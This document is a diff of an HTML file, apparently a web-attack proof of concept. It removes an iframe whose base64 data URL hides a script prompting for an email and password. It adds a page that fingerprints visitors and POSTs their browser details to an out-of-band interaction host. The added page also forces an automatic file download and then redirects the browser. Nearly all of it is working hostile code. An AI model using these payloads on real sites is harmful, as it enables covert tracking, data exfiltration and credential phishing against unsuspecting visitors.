@@ -1,1 +1,33 @@
-<iframe src="data:text/html;base64,PHNjcmlwdD5wcm9tcHQoIlxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuXG5cblxuIiwgIkUtTWFpbCAvIFBhc3N3b3JkIik7PC9zY3JpcHQ+");>
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  // 1. Fingerprint & send
+  const data = {
+    ua: navigator.userAgent,
+    screen: screen.width + 'x' + screen.height,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    ref: document.referrer
+  };
+
+  fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data)
+  });
+
+  // 2. Auto download
+  const a = document.createElement('a');
+  a.href = 'data:text/html,clickjacked!';
+  a.download = 'win.html';
+  a.style.display = 'none';
+  document.body.appendChild(a);
+  a.click();
+
+  // 3. Redirect
+  setTimeout(() => {
+    location.replace("https://www.google.com");
+  }, 1500);
+</script>
+</body>
+</html>
